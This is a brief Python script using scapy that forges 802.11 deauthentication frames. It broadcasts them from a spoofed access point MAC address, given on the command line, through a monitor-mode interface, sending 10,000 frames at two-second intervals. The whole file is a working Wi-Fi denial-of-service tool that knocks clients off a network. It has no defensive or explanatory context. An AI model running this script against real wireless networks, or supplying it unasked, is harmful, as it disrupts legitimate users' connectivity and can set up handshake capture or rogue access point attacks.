#!/usr/bin/python

from scapy.all import *
import sys

brdmac = "ff:ff:ff:ff:ff:ff"

def usage():
    print("Usage: python " + sys.argv[0] + " 00:11:22:33:44:55")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        usage()
        sys.exit(1)

    pkt = RadioTap()/Dot11(addr=brdmac, addr2=sys.argv[1], addr3=sys.argv[1])/Dot11Deauth()

    sendp(pkt, iface='mon0', count=10000, inter=2)    
